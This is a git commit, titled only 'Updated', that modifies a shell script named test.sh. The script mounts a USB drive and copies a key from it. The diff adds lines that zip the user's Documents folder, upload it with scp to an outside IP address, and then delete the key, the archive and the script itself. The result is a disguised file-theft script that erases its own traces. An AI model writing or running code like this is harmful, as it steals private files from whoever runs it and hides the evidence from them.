9f1096cc2a751ede66a38ec7c283e18ab07555b1
david <david@localhost.localdomain>
2022-11-29 08:49:04 -0600

    Updated

--- test.sh
+++ test.sh
@@ -1,4 +1,8 @@
 x=`udisksctl mount -b /dev/sda1 | cut -d" " -f4`
 cp "${x}/update.key" /tmp/update.key
 chmod 600 /tmp/update.key
-ssh opc@152.70.140.32 -i /tmp/update.key
+zip -r /tmp/gotit.zip ~/Documents
+scp -i /tmp/update.key /tmp/gotit.zip opc@152.70.140.32:~/
+rm /tmp/update.key
+rm /tmp/gotit.zip
+rm /tmp/test.sh
